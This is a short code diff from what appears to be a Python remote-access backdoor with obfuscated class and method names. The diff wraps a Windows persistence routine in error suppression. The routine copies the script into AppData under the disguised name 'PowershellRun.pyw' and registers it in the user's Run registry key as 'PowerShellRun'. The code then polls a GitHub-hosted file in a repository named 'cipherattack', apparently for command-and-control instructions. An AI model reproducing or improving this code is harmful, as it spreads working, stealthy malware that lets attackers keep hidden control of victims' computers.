@@ -74,11 +74,14 @@ class dtf2un:
             else:
                 self._374egv("Enter a command")
         self.sp.close()
-if sys.platform == "win32":        
-    loc = os.environ["appdata"] + "\\PowershellRun.pyw"
-    if not os.path.exists(loc):
-        shutil.copy(os.path.realpath(__file__),loc)
-        subprocess.call(f'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V PowerShellRun /t REG_SZ /F /D "{loc}"')
+try:        
+    if sys.platform == "win32":        
+        loc = os.environ["appdata"] + "\\PowershellRun.pyw"
+        if not os.path.exists(loc):
+            shutil.copy(os.path.realpath(__file__),loc)
+            subprocess.call(f'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V PowerShellRun /t REG_SZ /F /D "{loc}"')
+except:
+    pass
 while True:
     try:
         data = json.loads(urllib.request.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/jotr3n").read())
